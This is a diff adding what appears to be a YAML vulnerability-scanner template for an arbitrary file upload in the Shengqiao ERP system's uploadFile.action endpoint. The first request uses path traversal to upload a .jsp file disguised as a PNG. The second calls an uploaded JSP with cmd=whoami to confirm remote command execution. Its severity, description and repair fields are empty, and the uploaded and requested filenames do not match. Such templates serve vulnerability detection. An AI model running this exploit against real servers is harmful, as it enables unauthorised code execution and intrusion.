@@ -1,0 +1,32 @@
+id:
+
+info:
+  name: 圣乔ERP系统 uploadFile.action 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /erp/wap/../uploadFile.action
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+    Content-Type: multipart/form-data boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Accept: '*/*'
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip
+    Connection: close
+  data: |
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="Filedata"; filename="test213.jsp"
+    Content-Type: image/png
+
+    123456
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+response1:
+requests2:
+  method: GET
+  path: /erp/wap/../FileStorageDirectorynull/rce.jsp?cmd=whoami
+response2:
+  code: 200
+  body: 123456
